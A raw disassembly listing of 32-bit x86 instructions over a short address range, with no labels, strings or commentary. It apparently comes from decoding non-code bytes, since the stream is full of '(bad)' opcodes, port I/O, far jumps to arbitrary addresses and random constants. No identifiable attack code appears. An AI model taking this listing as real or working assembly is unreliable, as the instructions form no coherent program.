  403fe4:	and    BYTE PTR [ebx+0x39f0264a],bh
  403fea:	icebp  
  403feb:	nop
  403fec:	cmp    DWORD PTR fs:[esi+0x6c],edx
  403ff0:	imul   eax,ebp,0xffffffd4
  403ff3:	jae    0x403ffc
  403ff5:	add    bl,0xe4
  403ff8:	jns    0x403fa5
  403ffa:	add    eax,0x7eb5403c
  403fff:	mov    bh,0xcc
  404001:	std    
  404002:	out    0x83,eax
  404004:	or     ah,dl
  404006:	scas   eax,DWORD PTR es:[edi]
  404007:	mov    ah,dl
  404009:	mov    bh,0x17
  40400b:	mov    esi,0xd350d20f
  404010:	push   ss
  404011:	sbb    DWORD PTR [ebx],0x2ae1d992
  404017:	cmp    al,0x20
  404019:	rcr    esi,1
  40401b:	fnstenv [bx+si-0x2c]
  40401f:	fwait
  404020:	sti    
  404021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404022:	lahf   
  404023:	sahf   
  404024:	pusha  
  404025:	mov    ds:0x5a6c1bc0,al
  40402a:	popa   
  40402b:	outs   dx,BYTE PTR ds:[esi]
  40402c:	lods   al,BYTE PTR ds:[esi]
  40402d:	aad    0xb7
  40402f:	icebp  
  404030:	add    ebx,edi
  404032:	cmp    dl,BYTE PTR [esi]
  404034:	push   cs
  404035:	fucomp st(0)
  404037:	push   eax
  404038:	ds jbe 0x404003
  40403b:	imul   edi,DWORD PTR [ebx+0x12],0xffffffda
  40403f:	mov    bh,BYTE PTR [ebx]
  404041:	xchg   ebp,eax
  404042:	(bad)  
  404043:	(bad)  
  404045:	mov    al,0x20
  404047:	xchg   esp,eax
  404048:	push   ds
  404049:	mov    dl,BYTE PTR [ebp+eiz*8-0x4c025b8f]
  404050:	mov    bh,0x1a
  404052:	xchg   edx,eax
  404053:	jmp    0xab8c0208
  404058:	fs fwait
  40405a:	sub    dh,BYTE PTR [ecx+eax*4-0x2b]
  40405e:	leave  
  40405f:	in     al,0x4
  404061:	add    eax,0x871e0d85
  404066:	daa    
  404067:	mov    ch,0x57
  404069:	push   0xffffffd6
  40406b:	mov    WORD PTR [ebx+eiz*1-0x2],?
  40406f:	int3   
  404070:	cmp    eax,0x2a055c6b
  404075:	fist   WORD PTR [edx]
  404077:	mov    esi,DWORD PTR [edx]
  404079:	mov    ds:0x187c4473,al
  40407e:	shr    DWORD PTR [esp+eax*2-0xd],cl
  404082:	and    al,0xb1
  404084:	sbb    al,0x20
  404086:	sbb    al,BYTE PTR [eax-0x41]
  404089:	pop    es
  40408a:	add    eax,0x7369bcda
  40408f:	jno    0x4040d3
  404091:	cmp    DWORD PTR [ebp-0x3c],edx
  404094:	repz sti 
  404096:	ins    DWORD PTR es:[edi],dx
  404097:	add    al,0xd4
  404099:	dec    esp
  40409a:	aam    0x7e
  40409c:	xchg   ecx,eax
  40409d:	clc    
  40409e:	jmp    0x1aa17d36
  4040a3:	mov    bl,0xc6
  4040a5:	pop    ebx
  4040a6:	mov    edx,0x317e302b
  4040ab:	sbb    al,0xf6
  4040ad:	mov    al,0x5d
  4040af:	test   BYTE PTR [ecx-0x2a943f9],bl
  4040b5:	jecxz  0x404087
  4040b7:	and    al,0x3d
  4040b9:	sbb    ah,BYTE PTR [ecx-0x5ef282c8]
  4040bf:	mov    ch,0xdc
  4040c1:	mov    WORD PTR [eax+ebp*4-0xe],ss
  4040c5:	sbb    eax,0xfffffffd
  4040c8:	mov    cl,0x72
  4040ca:	cmp    edx,DWORD PTR cs:[eax+eax*1+0x7d]
  4040cf:	pop    ebx
  4040d0:	outs   dx,BYTE PTR ds:[esi]
  4040d1:	dec    edx
  4040d2:	lahf   
  4040d3:	or     DWORD PTR [ebp+0x2a],edx
  4040d6:	in     al,0x78
  4040d8:	inc    eax
  4040d9:	les    ebp,FWORD PTR [edi+0x9ecc020]
  4040df:	pop    ds
  4040e0:	xchg   DWORD PTR [edx+0x33e72b66],ecx
  4040e6:	and    eax,0x24508ff9
  4040eb:	mov    eax,DWORD PTR [esi]
  4040ed:	leave  
  4040ee:	and    eax,0x5c7bde13
  4040f3:	sti    
  4040f4:	aas    
  4040f5:	xchg   edx,eax
  4040f6:	sar    ch,0xec
  4040f9:	ret    
  4040fa:	iret   
  4040fb:	push   edx
  4040fc:	xor    dl,cl
  4040fe:	inc    ebp
  4040ff:	ss jle 0x4040d3
  404102:	jmp    0x8176:0x5d8f0766
  404109:	lods   eax,DWORD PTR ds:[esi]
  40410a:	ja     0x404179
  40410c:	or     ch,BYTE PTR [ecx]
  40410e:	lock add al,0x47
  404111:	xchg   edi,eax
  404112:	int3   
  404113:	popa   
  404114:	jg     0x404136
  404116:	dec    edi
  404117:	(bad)  
  404118:	jmp    0xac20:0x88a711a7
  40411f:	or     DWORD PTR [edx+0x20cf40be],ecx
  404125:	mov    ecx,0x7031b9b5
  40412a:	in     al,0x3d
  40412c:	cmp    esi,DWORD PTR [eax-0x74a8bcd2]
  404132:	inc    esi
  404133:	inc    eax
  404134:	daa    
  404135:	(bad)  
  404136:	jmp    0x62405d8d
  40413b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40413c:	add    DWORD PTR [ecx+0x4bda6c2a],0x69db86c2
  404146:	or     BYTE PTR ds:0x120c80d2,cl
  40414c:	xor    DWORD PTR [edi+eax*8+0x5e],edi
  404150:	push   ss
  404151:	iret   
  404152:	jmp    0x3e923b93
  404157:	lds    edx,FWORD PTR ds:0xdd899c22
  40415d:	mov    al,0x90
  40415f:	xchg   BYTE PTR [ecx+0x73],ah
  404162:	push   ebx
  404163:	mov    ah,0xf3
  404165:	cmp    eax,0xee414ed0
  40416a:	mov    dl,0x3b
  40416c:	retf   
  40416d:	mov    ebx,0x8e6c5ebe
  404172:	pop    ecx
  404173:	mov    bh,0x76
  404175:	jo     0x404149
  404177:	pop    ds
  404178:	outs   dx,BYTE PTR ds:[esi]
  404179:	ss test eax,0x279d1dc9
  40417f:	sbb    DWORD PTR [ebp*4-0x2c749a46],edi
  404186:	lea    esp,[ecx]
  404188:	mov    ch,0x7
  40418a:	and    BYTE PTR [ecx+0x4c],dh
  40418d:	(bad)  
  40418e:	xchg   edx,eax
  40418f:	ins    DWORD PTR es:[edi],dx
  404190:	mov    ds:0xb7fb0f08,al
  404195:	in     al,0x19
  404197:	pusha  
  404198:	jmp    0xb7320c0c
  40419d:	icebp  
  40419e:	lahf   
  40419f:	int3   
  4041a0:	inc    eax
  4041a1:	cmp    BYTE PTR [ebx-0xfbfab89],ch
  4041a7:	mov    cl,0x4
  4041a9:	mov    cl,0x98
  4041ab:	adc    dh,BYTE PTR [edx+eax*2-0x7e]
  4041af:	call   0x3a42e9e3
  4041b4:	mov    ch,0xb
  4041b6:	gs scas eax,DWORD PTR es:[edi]
  4041b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041b9:	retf   0x5ceb
  4041bc:	(bad)  
  4041bd:	sbb    BYTE PTR [ecx+0x76],bh
  4041c0:	push   esp
  4041c1:	leave  
  4041c2:	inc    eax
  4041c3:	or     eax,0x48eb9030
  4041c8:	push   0x3945ac02
  4041cd:	repz and bl,BYTE PTR gs:[ebp+ecx*2+0x9]
  4041d3:	cmp    esi,ecx
  4041d5:	sub    BYTE PTR [esp+edi*2-0x2253401b],ah
  4041dc:	ret    0x3312
  4041df:	xchg   esi,eax
  4041e0:	sub    al,0x7d
  4041e2:	scas   al,BYTE PTR es:[edi]
  4041e3:	mov    eax,0x4dab02b3
  4041e8:	sbb    BYTE PTR [edi+0x9],ah
  4041eb:	mov    bl,0x8f
  4041ed:	call   0x36df:0x362fa098
  4041f4:	aam    0x26
  4041f6:	in     al,0xe7
  4041f8:	pop    esi
  4041f9:	inc    ebp
  4041fa:	inc    esp
  4041fb:	and    BYTE PTR [ecx+0x437c7d0d],bl
  404201:	pop    esp
  404202:	sbb    ecx,DWORD PTR [ebp+0x41c6f454]
  404208:	mov    al,0xf8
  40420a:	daa    
  40420b:	test   BYTE PTR [eax+esi*4+0x223612f8],bl
  404212:	enter  0xa960,0xd0
  404216:	lahf   
  404217:	fmul   DWORD PTR [ebp+0x51]
  40421a:	cmp    edi,esi
  40421c:	dec    eax
  40421d:	clc    
  40421e:	mov    ch,al
  404220:	imul   ecx,DWORD PTR [ecx+0x48],0xa5358273
  404227:	jnp    0x4041c5
  404229:	fsub   DWORD PTR [eax+0x5e]
  40422c:	bound  edx,QWORD PTR [ebp+eiz*8+0x2]
  404230:	adc    BYTE PTR [esi+0x6f733b10],al
  404236:	jg     0x4041c4
  404238:	gs cmp al,0x72
  40423b:	or     ecx,esp
  40423d:	mov    eax,0x22bd5b03
  404242:	dec    ebp
  404243:	mov    bh,dh
  404245:	jb     0x404261
  404247:	push   ebp
  404248:	popf   
  404249:	xor    BYTE PTR [edx],dh
  40424b:	(bad)  
  40424c:	bound  esp,QWORD PTR [ebp+0x3d13ee33]
  404252:	popf   
  404253:	adc    DWORD PTR [edi-0x74],edx
  404256:	cwde   
  404257:	lahf   
  404258:	daa    
  404259:	lahf   
  40425a:	push   edx
  40425b:	pop    esp
  40425c:	xchg   BYTE PTR [esi+0x28e26024],bl
  404262:	mov    esp,0xfd0ff3da
  404267:	or     ebp,DWORD PTR [eax]
  404269:	clc    
  40426a:	in     eax,0x7e
  40426c:	outs   dx,DWORD PTR ds:[esi]
  40426d:	mov    eax,DWORD PTR [ebp+edi*1-0x444e434d]
  404274:	sahf   
  404275:	inc    esp
  404276:	sbb    DWORD PTR [ebp+0x4fae4d26],ebp
  40427c:	add    BYTE PTR [ecx-0x56],ah
  40427f:	es dec edi
  404281:	push   eax
  404282:	lods   eax,DWORD PTR ds:[esi]
  404283:	mov    al,ds:0xa47602c5
  404288:	inc    edx
  404289:	add    ebx,edx
  40428b:	push   cs
  40428c:	retf   
  40428d:	lahf   
  40428e:	retf   
  40428f:	outs   dx,BYTE PTR ds:[esi]
  404290:	iret   
  404291:	fst    DWORD PTR [ebp-0x1c30fdea]
  404297:	into   
  404298:	mov    BYTE PTR [edx],0x32
  40429b:	sub    ecx,DWORD PTR [eax-0x5d02f984]
  4042a1:	fisubr DWORD PTR [edx+0x7bce05f6]
  4042a7:	iret   
  4042a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042a9:	test   DWORD PTR [ebx-0x68],0xf2cfd374
  4042b0:	jmp    0x40426b
  4042b2:	inc    edx
  4042b3:	cmp    DWORD PTR [ebp+0xe],esi
  4042b6:	addr16 pop ebx
  4042b8:	test   ebx,eax
  4042ba:	adc    DWORD PTR gs:[ebx+0x2b],edx
  4042be:	mov    ebp,0x289a1d73
  4042c3:	lods   al,BYTE PTR ds:[esi]
  4042c4:	pop    esp
  4042c5:	jle    0x4042ca
  4042c7:	mov    ebp,0xc9a09459
  4042cc:	adc    dl,bl
  4042ce:	mov    dl,0xdd
  4042d0:	outs   dx,DWORD PTR ds:[esi]
  4042d1:	ds das 
  4042d3:	push   0xffffffe1
  4042d5:	or     BYTE PTR [edi],ah
  4042d7:	inc    eax
  4042d8:	mov    WORD PTR [ecx],cs
  4042da:	popa   
  4042db:	jle    0x40426b
  4042dd:	in     eax,dx
  4042de:	sti    
  4042df:	mov    esp,0x79f1f5b
  4042e4:	dec    esp
  4042e5:	push   ebx
  4042e6:	jbe    0x404288
  4042e8:	dec    edi
  4042e9:	push   ebx
  4042ea:	push   es
  4042eb:	mov    eax,0x223b07de
  4042f0:	leave  
  4042f1:	jb     0x4042fe
  4042f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042f4:	and    al,0x80
  4042f6:	stos   DWORD PTR es:[edi],eax
  4042f7:	ja     0x404333
  4042f9:	jbe    0x4042ab
  4042fb:	jl     0x404379
  4042fd:	fidiv  WORD PTR [ebp+0x15]
  404300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404301:	sti    
  404302:	mov    esi,0x297fb21b
  404307:	xchg   edx,eax
  404308:	aad    0x36
  40430a:	mov    al,0x7a
  40430c:	mov    bh,0xd
  40430e:	inc    esp
  40430f:	test   DWORD PTR [ebx+0x46],esi
  404312:	pop    ds
  404313:	out    dx,eax
  404314:	mov    edx,0xb6a8bd54
  404319:	mov    dl,0xa9
  40431b:	mov    ds:0x460d9a0e,eax
  404320:	mov    cl,0x1c
  404322:	pop    edx
  404323:	cmp    al,BYTE PTR [ebx]
  404325:	idiv   BYTE PTR [ecx-0x23]
  404328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404329:	sub    esi,esp
  40432b:	in     al,0x87
  40432d:	jle    0x4042ed
  40432f:	cld    
  404330:	test   al,0xa2
  404332:	inc    esi
  404333:	mov    edi,DWORD PTR [ebx-0x768cf784]
  404339:	adc    DWORD PTR [edx+0x6f14b679],ecx
  40433f:	call   0xaa81bd77
  404344:	xchg   esp,eax
  404345:	dec    esp
  404346:	(bad)
  404349:	sti    
  40434a:	jmp    0x32f7:0x4034cafe
  404351:	mov    dl,0x37
  404353:	mov    dl,0x92
  404355:	sub    BYTE PTR [eax+0x42bece39],ah
  40435b:	adc    eax,0xc1dcf323
  404360:	je     0x404339
  404362:	cmp    eax,0x83cccd14
  404367:	int    0x47
  404369:	lea    esp,[esi-0x73a22f81]
  40436f:	outs   dx,DWORD PTR ds:[esi]
  404370:	in     eax,0xa1
  404372:	fwait
  404373:	(bad)  
  404374:	int    0x9
  404376:	ins    BYTE PTR es:[edi],dx
  404377:	cwde   
  404378:	push   cs
  404379:	je     0x404333
  40437b:	(bad)  
  40437d:	xor    BYTE PTR [eax+esi*8+0x12b1a546],ch
  404384:	sub    eax,ecx
  404386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404387:	pop    ebx
  404388:	fisttp QWORD PTR [eax-0x7124a8d5]
  40438e:	inc    ebp
  40438f:	add    DWORD PTR [eax+0x3d],edi
  404392:	ss and ax,0xb75c
  404397:	mov    al,ds:0xa1d1bf83
  40439c:	xor    esi,ebp
  40439e:	adc    eax,0x89512bac
  4043a3:	ret    
  4043a4:	jp     0x40440b
  4043a6:	(bad)  
  4043a7:	test   eax,0xb6f907c4
  4043ac:	(bad)  
  4043ad:	loopne 0x404332
  4043af:	xor    DWORD PTR ds:0xd52e7835,ebp
  4043b5:	js     0x4043ea
  4043b7:	and    eax,0xbced442f
  4043bc:	sbb    dh,0x9c
  4043bf:	pop    ecx
  4043c0:	pop    edx
  4043c1:	and    al,BYTE PTR [edx]
  4043c3:	test   BYTE PTR [eax],al
  4043c5:	inc    eax
  4043c6:	int3   
  4043c7:	imul   eax,DWORD PTR es:[edx-0x406cd7c5],0xc2904068
  4043d2:	adc    DWORD PTR [ebx+0x159f3c8b],ecx
  4043d8:	push   0xb5af953d
  4043dd:	inc    ebp
  4043de:	sbb    eax,0xc4ef1438
  4043e3:	push   DWORD PTR [ebx-0x33ea763f]
  4043e9:	and    al,0x1c
  4043eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043ec:	xor    eax,0xb3f4a7a3
  4043f1:	clc    
  4043f2:	fs or  eax,0x209377ae
  4043f8:	mov    bh,0x14
  4043fa:	and    edx,eax
  4043fc:	dec    eax
  4043fd:	xchg   edx,eax
  4043fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043ff:	in     eax,dx
  404400:	aad    0x24
  404402:	div    DWORD PTR [edi]
  404404:	test   al,0x6f
  404406:	push   0x381e6183
  40440b:	in     al,dx
  40440c:	push   ebx
  40440d:	jo     0x40440c
  40440f:	shl    BYTE PTR [ebx],cl
  404411:	adc    edi,edx
  404413:	mov    ?,WORD PTR [ecx-0x6f]
  404416:	into   
  404417:	loop   0x4043f1
  404419:	int3   
  40441a:	ja     0x404494
  40441c:	dec    edi
  40441d:	pop    esi
  40441e:	add    eax,0xd3afe6
  404423:	ds (bad) 
  404425:	test   DWORD PTR [eax],ebx
  404427:	push   es
  404428:	hlt    
  404429:	cmp    bh,BYTE PTR [esi]
  40442b:	mov    bh,0x49
  40442d:	gs push ecx
  40442f:	das    
  404430:	add    eax,0xf9ef7b12
  404435:	nop
  404436:	jmp    0x66d:0x3c58ce29
  40443d:	fstp   TBYTE PTR [ebx+ecx*4-0x71]
  404441:	ret    0x9672
  404444:	lahf   
  404445:	ja     0x4044b9
  404447:	mov    ah,0x7a
  404449:	push   es
  40444a:	gs cli 
  40444c:	jmp    0xb6364094
  404451:	push   ds
  404452:	in     al,dx
  404453:	push   cs
  404454:	clc    
  404455:	pusha  
  404456:	adc    ecx,DWORD PTR ds:0xd7899da2
  40445c:	imul   edi,DWORD PTR [ecx-0x48],0xb318d16e
  404463:	imul   esp,DWORD PTR [edx-0x75],0xe6ff769d
  40446a:	inc    ebp
  40446b:	lods   eax,DWORD PTR ds:[esi]
  40446c:	sub    eax,0xe5824585
  404471:	out    0xed,al
  404473:	ret    
  404474:	mov    ebp,0xeaf59c64
  404479:	mov    edx,0xc2b50b39
  40447e:	test   dl,bh
  404480:	inc    ebp
  404481:	xlat   BYTE PTR ds:[ebx]
  404482:	push   es
  404483:	jae    0x4044c7
  404485:	lds    edi,FWORD PTR [edi+ecx*4+0xcae00b4]
  40448c:	inc    ebp
  40448d:	std    
  40448e:	leave  
  40448f:	and    al,0xe9
  404491:	jmp    0x6ea7:0x6fa8b82a
  404498:	or     al,0xdd
  40449a:	out    dx,eax
  40449b:	shl    DWORD PTR [eax+0x1a],cl
  40449e:	xor    al,0xa
  4044a0:	and    dl,ch
  4044a2:	mov    ebx,DWORD PTR [ecx+0x7d]
  4044a5:	scas   eax,DWORD PTR es:[edi]
  4044a6:	ror    DWORD PTR [eax],0xa
  4044a9:	out    0x7,eax
  4044ab:	lods   al,BYTE PTR ds:[esi]
  4044ac:	mov    al,ds:0x9b958557
  4044b1:	ja     0x4044e8
  4044b3:	in     eax,dx
  4044b4:	dec    edi
  4044b5:	shr    DWORD PTR [eax-0x40],cl
  4044b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044b9:	inc    ebp
  4044ba:	jb     0x404522
  4044bc:	or     DWORD PTR [eax],ebx
  4044be:	adc    edx,ebp
  4044c0:	jecxz  0x404510
  4044c2:	loop   0x40448c
  4044c4:	lahf   
  4044c5:	mov    ds:0x8daf5d49,al
  4044ca:	in     eax,dx
  4044cb:	jns    0x4044a5
  4044cd:	and    bh,BYTE PTR [ebx-0x2cea90a0]
  4044d3:	mov    ebp,DWORD PTR [ebp+eiz*2-0x8149290]
  4044da:	pmaxub mm4,QWORD PTR [edi]
  4044dd:	xchg   DWORD PTR [ebx],edi
  4044df:	stc    
  4044e0:	mov    al,ds:0x32dbee41
  4044e5:	sub    al,0xbf
  4044e7:	jmp    0x964ac83a
  4044ec:	xlat   BYTE PTR ds:[ebx]
  4044ed:	test   eax,0x6cbab08c
  4044f2:	adc    ebx,edi
  4044f4:	loope  0x4044e9
  4044f6:	mov    edx,0xbd7c9a12
  4044fb:	inc    esi
  4044fc:	xchg   ebp,eax
  4044fd:	jo     0x4044d3
  4044ff:	dec    edx
  404500:	sub    esp,DWORD PTR [ecx-0x20c96323]
  404506:	cmp    dl,BYTE PTR [eax+0x11]
  404509:	push   ds
  40450a:	test   eax,0x27529c72
  40450f:	push   ebp
  404510:	mov    bl,0x86
  404512:	aas    
  404513:	sahf   
  404514:	and    esi,DWORD PTR [edi]
  404516:	mov    bl,0x7a
  404518:	mov    bh,0x94
  40451a:	sub    edx,DWORD PTR [edi+0x20]
  40451d:	inc    edi
  40451e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40451f:	sub    DWORD PTR [ecx-0x73ef0960],edi
  404525:	jle    0x4044b1
  404527:	test   DWORD PTR [edx-0x2c265cdf],edx
  40452d:	pop    esp
  40452e:	sub    eax,ecx
  404530:	xchg   esp,eax
  404531:	mov    ch,0x24
  404533:	cli    
  404534:	push   es
  404535:	sbb    BYTE PTR [ebx],ch
  404537:	pop    esp
  404538:	adc    BYTE PTR [esi-0x4ec8b953],dh
  40453e:	cmp    DWORD PTR [ebx+0x5a],esp
  404541:	mov    esi,0x6ba03c8a
  404546:	or     al,0x83
  404548:	mov    DWORD PTR ds:0x1eaa1a16,edi
  40454e:	ja     0x404583
  404550:	mov    DWORD PTR ds:0x8d336e6,0xe356ff34
  40455a:	into   
  40455b:	xchg   ecx,eax
  40455c:	mov    ebp,0xdb2381fd
  404561:	ins    BYTE PTR es:[edi],dx
  404562:	test   DWORD PTR [esi-0x48cc0f01],edx
  404568:	cmp    ah,BYTE PTR [esi-0x36]
  40456b:	in     al,dx
  40456c:	lock xchg edi,eax
  40456e:	pop    es
  40456f:	(bad)  
  404570:	cmp    DWORD PTR [edi+0x5f],esi
  404573:	test   eax,0x1b1d252f
  404578:	leave  
  404579:	shl    BYTE PTR [ecx+0x3a],0x58
  40457d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40457e:	jnp    0x4045fc
  404580:	sbb    eax,0x37c49364
  404585:	sti    
  404586:	hlt    
  404587:	xor    eax,0x6ac36f4d
  40458c:	and    DWORD PTR [edi+0x22925c97],esi
  404592:	xchg   esp,eax
  404593:	push   esp
  404594:	retf   
  404595:	mov    eax,ds:0xf71d8ff7
  40459a:	mov    ebx,0x61cb166a
  40459f:	push   ss
  4045a0:	imul   ebp,DWORD PTR [ebp+0xb],0xb633d7e3
  4045a7:	or     BYTE PTR [edx+0x39],ch
  4045aa:	fnstcw WORD PTR [ebx+0x7b]
  4045ad:	or     cl,BYTE PTR [ebx+0x34e7ecbb]
  4045b3:	xor    BYTE PTR [ecx],bh
  4045b5:	inc    edx
  4045b6:	xchg   DWORD PTR [edx-0x4894869f],ecx
  4045bc:	mov    bh,0x2
  4045be:	pop    eax
  4045bf:	pop    ecx
  4045c0:	loopne 0x404634
  4045c2:	dec    esi
  4045c3:	enter  0x75d5,0x95
  4045c7:	sbb    al,0x2c
  4045c9:	sub    BYTE PTR [eax],ah
  4045cb:	push   ebp
  4045cc:	stc    
  4045cd:	ret    0x7fcb
  4045d0:	jne    0x40459e
  4045d2:	jge    0x404651
  4045d4:	shr    DWORD PTR [ebp-0x18],cl
  4045d7:	inc    eax
  4045d8:	cwde   
  4045d9:	push   ds
  4045da:	pushf  
  4045db:	xchg   edi,eax
  4045dc:	push   eax
  4045dd:	sub    eax,0x1da73acc
  4045e2:	xlat   BYTE PTR ds:[ebx]
  4045e3:	pop    ebx
  4045e4:	pop    esp
  4045e5:	outs   dx,DWORD PTR ds:[esi]
  4045e6:	in     al,dx
  4045e7:	call   0x4b91c3c2
  4045ec:	out    dx,eax
  4045ed:	cmp    al,0x21
  4045ef:	into   
  4045f0:	cmp    al,0x3
  4045f2:	fistp  WORD PTR [esi+esi*8-0x6b]
  4045f6:	popf   
  4045f7:	sbb    BYTE PTR [esi+0x1],cl
  4045fa:	xchg   esp,eax
  4045fb:	and    edi,esp
  4045fd:	loopne 0x4045ed
  4045ff:	add    ebp,esi
  404601:	mov    edx,0x5d62f21f
  404606:	call   0xe186a2b9
  40460b:	popf   
  40460c:	adc    al,0x76
  40460e:	pop    eax
  40460f:	ins    DWORD PTR es:[edi],dx
  404610:	fwait
  404611:	ja     0x404667
  404613:	inc    DWORD PTR [esi-0x42]
  404616:	add    DWORD PTR [eax+eiz*2-0x48],esp
  40461a:	fisubr WORD PTR [ecx+0x2e]
  40461d:	mov    ebp,DWORD PTR [edx]
  40461f:	push   es
  404620:	inc    eax
  404621:	xchg   esi,eax
  404622:	xor    ebp,DWORD PTR [ebp+0x5e]
  404625:	ret    
  404626:	mov    ds:0xb9ed2e90,al
  40462b:	neg    BYTE PTR [eax+edx*1+0x45]
  40462f:	das    
  404630:	aas    
  404631:	mov    dl,0x49
  404633:	jnp    0x4045eb
  404635:	mov    ecx,0xc8d88c4
  40463a:	arpl   WORD PTR [ecx-0x20],si
  40463d:	push   eax
  40463e:	leave  
  40463f:	xor    ecx,ecx
  404641:	xor    eax,0x85ca806e
  404646:	xor    dl,BYTE PTR [ecx]
  404648:	mov    edx,0xafe7ec6f
  40464d:	mov    cl,0x5e
  40464f:	push   ebx
  404650:	lods   eax,DWORD PTR ds:[esi]
  404651:	pusha  
  404652:	fbld   TBYTE PTR [ecx]
  404654:	cmp    eax,0x72768242
  404659:	and    ch,BYTE PTR [eax]
  40465b:	cmp    cl,dl
  40465d:	push   ds
  40465e:	ror    al,0x1d
  404661:	pop    ebx
  404662:	out    dx,al
  404663:	call   0x8d09:0x7c45a4d8
  40466a:	sub    ah,ah
  40466c:	sub    cl,al
  40466e:	cmp    al,0x7a
  404670:	push   0x2
  404672:	sti    
  404673:	popf   
  404674:	stc    
  404675:	xchg   esp,ebp
  404677:	push   esp
  404678:	sbb    al,0xfb
  40467a:	(bad)  
  40467b:	cmp    al,0xe
  40467d:	and    al,BYTE PTR [edx]
  40467f:	push   0x850e62d8
  404684:	data16 jbe 0x404633
  404687:	add    ebx,DWORD PTR [ebx-0x67]
  40468a:	call   ebp
  40468c:	ds jne 0x4046ec
  40468f:	mov    BYTE PTR [esi+0x2d501cd1],dh
  404695:	xlat   BYTE PTR ds:[ebx]
  404696:	dec    edx
  404697:	xor    ch,bh
  404699:	inc    ebp
  40469a:	in     eax,dx
  40469b:	add    DWORD PTR [esi-0x4e731853],edi
  4046a1:	xor    BYTE PTR [eax+0x62],al
  4046a4:	jge    0x40462d
  4046a6:	aad    0x87
  4046a8:	test   DWORD PTR [edi],esi
  4046aa:	lahf   
  4046ab:	ret    
  4046ac:	retf   0x9abd
  4046af:	inc    ebp
  4046b0:	jns    0x404670
  4046b2:	ja     0x40469a
  4046b4:	mov    ch,0x90
  4046b6:	sti    
  4046b7:	adc    ah,BYTE PTR ds:0x7902a0c5
  4046bd:	shr    BYTE PTR [ebx-0x37705675],1
  4046c3:	mov    ebp,0xf101dc1e
  4046c8:	gs mov esp,0x7a35fac9
  4046ce:	lock or edi,DWORD PTR [eax]
  4046d1:	fwait
  4046d2:	push   ss
  4046d3:	outs   dx,DWORD PTR ds:[esi]
  4046d4:	outs   dx,BYTE PTR ds:[esi]
  4046d5:	dec    eax
  4046d6:	or     al,0x65
  4046d8:	fwait
  4046d9:	adc    BYTE PTR ds:0x12a962de,0x15
  4046e0:	test   al,al
  4046e2:	xchg   esi,eax
  4046e3:	ret    
  4046e4:	sbb    eax,0x48571be5
  4046e9:	lods   al,BYTE PTR ds:[esi]
  4046ea:	scas   al,BYTE PTR es:[edi]
  4046eb:	sbb    al,0x3b
  4046ed:	stc    
  4046ee:	test   BYTE PTR ds:0x16bdcc4f,0x50
  4046f5:	aas    
  4046f6:	gs jecxz 0x4046eb
  4046f9:	jbe    0x404710
  4046fb:	outs   dx,DWORD PTR ds:[esi]
  4046fc:	mov    ch,0xef
  4046fe:	scas   eax,DWORD PTR es:[edi]
  4046ff:	mov    ecx,0xbac4a624
  404704:	cwde   
  404705:	dec    ecx
  404706:	dec    eax
  404707:	add    BYTE PTR ds:0xb55187ce,0x65
  40470e:	lods   eax,DWORD PTR ds:[esi]
  40470f:	xchg   ebp,eax
  404710:	cmp    al,0x9e
  404712:	mov    ds:0x8d0e8207,eax
  404717:	out    0x8a,eax
  404719:	fst    QWORD PTR [edx+edi*1]
  40471c:	pusha  
  40471d:	adc    edx,DWORD PTR [ebx]
  40471f:	sahf   
  404720:	mov    cl,0x69
  404722:	push   cs
  404723:	cmp    al,0xa6
  404725:	jb     0x40478b
  404727:	add    al,0xa6
  404729:	pop    edx
  40472a:	ret    
  40472b:	lods   eax,DWORD PTR ds:[esi]
  40472c:	or     BYTE PTR [ebx+0x7e],al
  40472f:	pop    cx
  404731:	xor    dh,BYTE PTR [edx+0x4a]
  404734:	dec    ecx
  404735:	mov    ah,0x45
  404737:	sub    edx,ecx
  404739:	xchg   ebp,eax
  40473a:	in     eax,0xb8
  40473c:	mov    esp,0xa13284fc
  404741:	ror    eax,1
  404743:	shl    DWORD PTR [edx+edx*2],0xff
  404747:	xchg   BYTE PTR [ebx-0x3ce5e92d],bh
  40474d:	(bad)  
  40474e:	and    esp,esi
  404750:	or     BYTE PTR [edi-0x402c5fb6],0xf1
  404757:	and    al,0x39
  404759:	push   esi
  40475a:	xor    DWORD PTR [esi],esi
  40475c:	pop    esp
  40475d:	pop    eax
  40475e:	sub    edi,DWORD PTR [ebp+0x60]
  404761:	inc    eax
  404762:	sub    BYTE PTR [eax+0x4],0xb4
  404766:	imul   edx,DWORD PTR [edx+ebp*4-0x67],0x1a
  40476b:	std    
  40476c:	scas   eax,DWORD PTR es:[edi]
  40476d:	outs   dx,BYTE PTR ds:[esi]
  40476e:	inc    ebp
  40476f:	dec    edi
  404770:	aas    
  404771:	outs   dx,DWORD PTR ds:[esi]
  404772:	stos   BYTE PTR es:[edi],al
  404773:	inc    esi
  404774:	adc    al,0x78
  404776:	pop    edi
  404777:	xchg   edi,eax
  404778:	imul   eax,DWORD PTR ds:0xae3b7f13,0xfffffff5
  40477f:	or     eax,esp
  404781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404782:	push   ebx
  404783:	inc    ebx
  404784:	or     dl,BYTE PTR [esi]
  404786:	mov    bh,0x52
  404788:	aaa    
  404789:	stc    
  40478a:	sub    edi,edi
  40478c:	dec    ebx
  40478d:	icebp  
  40478e:	mov    ecx,0x1efa7232
  404793:	mov    al,ds:0x7823503a
  404798:	repnz scas al,BYTE PTR es:[edi]
  40479a:	push   ebp
  40479b:	int3   
  40479c:	pop    ecx
  40479d:	cmc    
  40479e:	das    
  40479f:	jno    0x40481c
  4047a1:	xor    eax,0x4598502d
  4047a6:	retf   
  4047a7:	inc    edx
  4047a8:	and    DWORD PTR [ecx-0xf],0xc2d1d211
  4047af:	push   ds
  4047b0:	popf   
  4047b1:	jl     0x4047a8
